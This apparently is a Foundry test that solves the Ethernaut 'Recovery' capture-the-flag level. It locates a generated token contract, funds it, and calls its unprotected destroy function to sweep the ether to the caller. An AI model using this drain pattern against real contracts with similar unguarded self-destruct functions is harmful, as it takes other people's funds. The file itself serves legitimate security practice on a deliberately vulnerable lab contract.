// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "instances/17_Recovery.sol";

contract AttackerRecoveryTest is Test {
    function testRecovery() external {
        vm.prank(address(1));
        Recovery recovery = new Recovery();

        string memory name = "TOKEN";
        uint256 tokenSupply = 42_000_000;
        recovery.generateToken(name, tokenSupply);

        // Launch 'forge test -vvvv' once, get address and set TOKEN env and rerun...
        SimpleToken simpleToken = SimpleToken(payable(vm.envAddress("TOKEN")));
        assertEq(simpleToken.name(), name);

        (bool sent,) = address(simpleToken).call{value: 0.001 ether}("");
        require(sent, "Failed to send Ether");

        assertFalse(address(simpleToken).balance == 0);
        simpleToken.destroy(msg.sender);
        assertTrue(address(simpleToken).balance == 0);
    }
}
